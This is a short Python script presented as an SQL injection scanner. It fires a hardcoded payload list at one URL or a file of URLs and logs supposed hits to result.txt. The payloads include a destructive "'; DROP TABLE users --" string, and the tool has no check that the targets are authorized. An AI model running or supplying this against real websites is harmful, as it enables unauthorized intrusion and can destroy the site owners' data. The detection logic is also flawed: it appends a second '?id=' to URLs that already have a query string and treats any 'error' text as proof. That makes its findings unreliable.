# -*- coding: utf-8 -*-
import requests
import argparse
import time

def banner():
    print("""
   _____  ____  _        _____       _           _   _              
  / ____|/ __ \| |      |_   _|     (_)         | | (_)             
 | (___ | |  | | |        | |  _ __  _  ___  ___| |_ _  ___  _ __   
  \___ \| |  | | |        | | | '_ \| |/ _ \/ __| __| |/ _ \| '_ \  
  ____) | |__| | |____   _| |_| | | | |  __/ (__| |_| | (_) | | | | 
 |_____/ \___\_\______| |_____|_| |_| |\___|\___|\__|_|\___/|_| |_| 
                                   _/ |                             
                                  |__/                              

    tag: This is a scanner used to scan for SQL injection vulnerabilities
    @author: zxy
    @version: 1.0.0
    """)

def test_sql_injection(url, headers=None, delay=0):
    payloads = ["' OR '1'='1", "'; DROP TABLE users --", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1' #"]

    # 判断URL中是否包含'?'，以决定使用GET或POST请求
    if '?' in url:
        method = "GET"
    else:
        method = "POST"

    for payload in payloads:
        if method == "GET":
            target_url = f"{url}?id={payload}"
        else:
            target_url = url
            data = {"id": payload}

        try:
            if method == "GET":
                response = requests.get(target_url, headers=headers)
            else:
                response = requests.post(target_url, data=data, headers=headers)

            if "error" in response.text:
                print(f"[+] Vulnerable to SQL Injection ({method}): {target_url}")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target_url + "\n")
            else:
                print(f"[-] Not vulnerable ({method}): {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Error ({method}): {str(e)}")

        # 添加延迟，以防止请求过于频繁
        time.sleep(delay)

def main():
    banner()
    parser = argparse.ArgumentParser(description='SQL Injection Vulnerability Scanner')
    parser.add_argument("-u", "--url", dest="url", type=str, help="Example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="urls.txt")
    parser.add_argument("-d", "--delay", dest="delay", type=float, default=0, help="Delay between requests in seconds")
    args = parser.parse_args()

    if args.url:
        test_sql_injection(args.url, headers={"User-Agent": "Mozilla/5.0"}, delay=args.delay)
    elif args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        for j in url_list:
            test_sql_injection(j, headers={"User-Agent": "Mozilla/5.0"}, delay=args.delay)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
